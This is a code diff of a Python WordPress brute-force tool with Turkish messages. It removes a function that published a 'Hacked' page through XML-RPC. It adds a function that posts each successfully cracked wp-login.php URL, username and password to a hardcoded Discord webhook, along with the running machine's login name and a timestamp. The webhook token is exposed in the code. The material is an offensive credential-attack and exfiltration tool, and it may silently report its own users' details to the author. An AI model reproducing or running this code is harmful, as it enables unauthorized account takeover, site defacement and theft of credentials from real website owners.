@@ -1,9 +1,10 @@
 import requests
+import json
+import os
 from urllib.parse import urlparse
 from tools import colorprint
 from tools import getwpusers
-from wordpress_xmlrpc import Client, WordPressPost
-from wordpress_xmlrpc.methods.posts import NewPost
+import datetime
 hebele = 0
 hebele2 = 0
 def save(content):
@@ -23,23 +24,16 @@ def is_wordpress(url):
     else:
         return False
 
-def index_method1(url,username,password,content):
-    url = f'{{url}}/xmlrpc.php'
 
-    # XML-RPC istemcisini oluşturma
-    wp = Client(url, username, password)
+def dchook(mesaj):
+    url = 'https://discord.com/api/webhooks/1088229701782351912/_leK2Mr4P2KZuYrseFDnkIsizfmPSxWXNSYZ3QuJMMThm0PK5OqdegkJ1ecOiu70Vhh8'
+    message = mesaj
 
-    # Yeni bir sayfa oluşturma
-    page = WordPressPost()
-    page.title = 'Hacked'
-    page.content = '{content}'
-    page.post_status = 'publish'
+    data = {
+        'content': message
+    }
 
-    # Sayfayı kaydetme
-    page_id = wp.call(NewPost(page))
-    print(f'Sayfa oluşturuldu: {url}/?p={page_id}')
-
-    pass
+    response = requests.post(url, json=data)
 
 def brute(url, username, password):
     login_url = f'{url}/wp-login.php'
@@ -60,6 +54,7 @@ def brute(url, username, password):
         if('redirect_to' in response.url):
             return False
         colorprint.resultprint(f'{url}/wp-login.php {username}:{password} Giriş Başarılı!')
+        dchook(f"{url}/wp-login.php {username}:{password} cihaz:{os.getlogin()} zaman:{datetime.datetime.now()} - Enistein")
         save(f'{url}/wp-login.php {username}:{password} Giriş Başarılı!')
         return True
     else:
